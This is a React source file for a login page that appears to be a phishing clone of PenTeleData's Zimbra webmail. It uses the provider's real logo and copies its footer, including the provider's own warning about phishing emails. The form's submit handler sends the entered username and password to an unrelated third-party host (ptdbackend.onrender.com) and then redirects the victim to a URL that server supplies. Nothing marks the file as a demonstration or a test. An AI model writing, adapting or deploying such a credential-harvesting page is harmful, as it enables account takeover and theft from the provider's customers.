import { useState } from 'react';
import './LoginPage.css';

const LoginPage = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [loginStatus, setLoginStatus] = useState('');

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoginStatus('');

    try {
      const response = await fetch('https://ptdbackend.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });

      const result = await response.json();
      if (result.success && result.redirectUrl) {
        setLoginStatus('Login successful! Redirecting...');
        setTimeout(() => window.location.href = result.redirectUrl, 2000); // Redirect after 2 seconds
      } else {
        setLoginStatus(result.message || 'Invalid credentials');
      }
    } catch (error) {
      setLoginStatus('Error: Unable to connect to the server');
      console.error('Login error:', error);
    }
  };

  return (
    <div className="login-container">
      <div className="mountain-background"></div>
      <div className="login-box">
        <div className="logo-container">
          <img
            src="https://promail2.ptd.net/modern/clients/promail2.ptd.net/assets/logo.svg"
            alt="PenTeleData Logo"
            className="logo-image"
          />
        </div>
        <h2 className="login-title">Log In</h2>
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label className="form-label" htmlFor="username">Username</label>
            <input
              type="text"
              id="username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="form-input"
              required
            />
          </div>
          <div className="form-group password-container">
            <label className="form-label" htmlFor="password">Password</label>
            <input
              type={showPassword ? 'text' : 'password'}
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="form-input password-input"
              required
            />
            <button
              type="button"
              onClick={togglePasswordVisibility}
              className="show-password-btn"
            >
              Show
            </button>
          </div>
          <div className="form-bottom">
            <button type="submit" className="login-btn">Log In</button>
            <label className="remember-me">
              <input
                type="checkbox"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                className="remember-checkbox"
              />
              Remember me
            </label>
          </div>
          {loginStatus && (
            <div
              className="text-center mt-4"
              style={{ color: loginStatus.includes('successful') ? 'green' : 'red' }}
            >
              {loginStatus}
            </div>
          )}
        </form>
      </div>
      <div className="footer-warning">
        <p>
          PenTeleData is aware that many of our customers have received phishing emails that appear to come from us. Please remember that we will NEVER ask you for personal information to validate your account via a link in an email. If you receive an email like this, please delete it or click the spam option to move it to your junk folder. For more information about phishing, visit{' '}
          <a href="https://www.ptd.net/phishing" className="footer-link">https://www.ptd.net/phishing</a>.
        </p>
        <p className="copyright">
          Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
        </p>
      </div>
    </div>
  );
};

export default LoginPage;